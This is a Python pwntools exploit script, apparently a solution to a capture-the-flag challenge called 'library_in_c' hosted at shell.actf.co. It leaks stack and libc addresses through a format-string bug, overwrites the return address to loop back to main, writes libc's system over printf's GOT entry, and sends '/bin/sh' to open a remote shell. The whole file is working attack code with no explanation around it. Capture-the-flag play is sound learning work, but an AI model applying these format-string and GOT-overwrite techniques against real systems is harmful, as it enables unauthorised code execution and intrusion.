from pwn import *

def write(what, where):
    what = what & 0xffffff
    hi_byte = what >> 16
    low_word = what & 0xffff

    log.info(f'printing {hi_byte} to {where +2} and {low_word} to {where}')

    payload = b'%12$'
    payload += str(hi_byte).encode()
    payload += b's%12$hhn'
    payload += b'%12$'
    payload += str(low_word -hi_byte).encode()
    payload += b's%13$hn'
    payload += (32-len(payload))*b' '
    payload += p64(where+2)
    payload += p64(where)
    return payload

def check_payload(payload):
    if b'\n' in payload:
        log.error('error, payload contains newline')

context.log_level = "info"

elf = ELF('./library_in_c')
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
main = elf.symbols['main']

#r = process('./library_in_c')
r = remote('shell.actf.co', 20201)
#r = remote('localhost', 8080)

payload_leak = '%24$p %27$p'

r.sendline(payload_leak)
s = r.recvline()
s = r.recvline()
s = r.recvline()

stack_leak = int(s.split(b' ')[-2], 16)
ret_addr = stack_leak -216
libc_leak = int(s.split(b' ')[-1], 16)
libc_address = libc_leak - 0xf0 - libc.symbols['__libc_start_main']
libc_system = libc_address + libc.symbols['system']


log.info(f'return address stored at {hex(ret_addr)}')
log.info(f'libc at {hex(libc_address)}')

payload_ret2main = b'%20$n%64s%21$hn%1799s%22$hn     '
payload_ret2main += p64(ret_addr + 4)
payload_ret2main += p64(ret_addr + 2)
payload_ret2main += p64(ret_addr)

log.info(f'payload to ret2main {payload_ret2main}')
log.info('returning to main')

r.sendline(payload_ret2main)


s = r.recv()

payload_overwrite_got = write(libc_system, elf.symbols['got.printf'])
log.info(f'sending overwrite payload {payload_overwrite_got}')
r.sendline(payload_overwrite_got)
r.sendline(b'/bin/sh\x00')
r.recv()
r.interactive()
